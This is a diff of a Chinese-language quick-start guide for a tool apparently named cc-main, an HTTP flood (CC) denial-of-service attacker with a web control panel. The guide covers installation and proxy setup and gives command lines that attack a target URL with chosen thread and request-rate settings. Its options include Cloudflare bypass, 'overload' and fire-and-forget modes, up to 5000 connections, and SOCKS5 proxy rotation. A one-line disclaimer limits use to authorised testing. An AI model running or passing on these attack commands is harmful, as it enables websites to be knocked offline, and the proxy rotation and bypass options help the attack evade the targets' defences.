@@ -1,83 +1,158 @@
-# 🚀 快速开始指南
+# 🚀 快速启动指南
 
-## 一键安装使用
+## 一键安装并启动
 
-### 方法1: 全自动安装
+### 1. 克隆项目
 ```bash
-./setup.sh
+git clone https://github.com/wudi2898/cc-main.git
+cd cc-main
 ```
 
-### 方法2: 快速启动Web面板
+### 2. 一键安装
 ```bash
+sudo chmod +x install.sh
+sudo ./install.sh
+```
+
+### 3. 访问Web面板
+安装完成后，自动打开浏览器访问：
+- **本地访问**: http://localhost:5000
+- **远程访问**: http://你的IP:5000
+
+## 管理命令
+
+### 服务管理
+```bash
+cc-start      # 启动服务
+cc-stop       # 停止服务
+cc-restart    # 重启服务
+cc-status     # 查看状态
+cc-logs       # 查看日志
+```
+
+### 手动启动
+```bash
+# 前台启动
 ./start_panel.sh
+
+# 后台启动
+./start_panel.sh -b
+
+# 调试模式
+./start_panel.sh -d
+
+# 指定端口
+./start_panel.sh -p 8080
 ```
 
-## 🌐 Web控制面板
+## 配置代理
 
-启动后访问：
-- **本地**: http://localhost:5000  
-- **远程**: http://你的IP:5000
+### 编辑代理文件
+```bash
+sudo nano /opt/cc-main/config/socks5.txt
+```
 
-### 面板功能
-- 📊 **实时监控**: CPU、内存、网络
-- 📝 **任务管理**: 创建、启动、停止任务  
-- 📜 **实时日志**: WebSocket推送
-- ⏰ **定时任务**: 自动启动/停止
+添加SOCKS5代理，每行一个：
+```
+127.0.0.1:1080
+192.168.1.100:7890
+proxy.example.com:1080
+```
 
-## 💻 命令行快速使用
+### 重启服务
+```bash
+cc-restart
+```
+
+## 使用Web面板
+
+### 1. 创建任务
+- 选择攻击模式：CC/GET/POST/HEAD
+- 输入目标URL
+- 设置线程数和RPS
+- 配置高级参数
+
+### 2. 启动任务
+- 点击"启动任务"
+- 实时查看日志
+- 监控系统状态
+
+### 3. 停止任务
+- 点击"停止任务"
+- 查看统计报告
+
+## 命令行使用
 
 ### 基础攻击
 ```bash
-# 标准CC攻击
+# 进入安装目录
+cd /opt/cc-main
+
+# 激活虚拟环境
+source venv/bin/activate
+
+# 运行攻击
 python3 main.py cc https://target.com 100 10
-
-# 超负荷模式 (推荐)
-python3 main.py cc https://target.com 500 50 --fire-and-forget --overload
-
-# CF绕过攻击
-python3 main.py cc https://cf-site.com 100 10 --cf-bypass
 ```
 
-### 极限性能模式
+### 高级参数
 ```bash
-python3 main.py cc https://target.com 2000 200 \
+python3 main.py cc https://target.com 500 50 \
+  --cf-bypass \
   --overload \
   --fire-and-forget \
-  --burst \
-  --no-delay \
   --max-connections 5000
 ```
 
-## ⚡ 超负荷模式特点
+## 故障排除
 
-- **🔥 纯发送**: 不接收响应，RPS提升500%+
-- **🏊 连接池**: 智能复用，性能提升300%+  
-- **💾 内存优化**: 激进回收，占用减少40%
-- **💥 爆发模式**: 动态扩展，峰值性能
-- **⚡ 无延迟**: 极限速度模式
-
-## 📡 代理配置
-
-编辑代理文件：
+### 服务未启动
 ```bash
-# SOCKS5代理 (推荐)
-echo "your-proxy:1080" >> socks5.txt
+# 查看状态
+cc-status
 
-# HTTP代理
-echo "your-proxy:8080" >> http_proxies.txt
+# 查看日志
+cc-logs
+
+# 重启服务
+cc-restart
 ```
 
-## ⚠️ 重要提醒
+### 代理连接失败
+```bash
+# 测试代理
+python3 main.py check https://httpbin.org/ip 1 1
 
-**仅用于授权的安全测试！**
+# 检查代理文件
+cat /opt/cc-main/config/socks5.txt
+```
 
-1. ✅ 获得目标系统授权
-2. ✅ 遵守法律法规  
-3. ✅ 用于安全研究
-4. ❌ 禁止恶意攻击
+### 端口被占用
+```bash
+# 查看端口占用
+lsof -i :5000
 
-## 🆘 需要帮助？
+# 使用其他端口
+./start_panel.sh -p 8080
+```
 
-- 📖 详细文档: [README.md](README.md)
-- 🐛 问题报告: 创建Issue
-- 💬 技术支持: 查看故障排除
+## 卸载
+
+### 完全卸载
+```bash
+sudo ./uninstall.sh
+```
+
+## 注意事项
+
+⚠️ **重要提醒**：
+- 仅用于授权的安全测试
+- 遵守当地法律法规
+- 获得目标系统明确授权
+- 承担使用后果和责任
+
+## 技术支持
+
+- **项目地址**: https://github.com/wudi2898/cc-main
+- **问题反馈**: 提交Issue
+- **功能建议**: 提交Pull Request
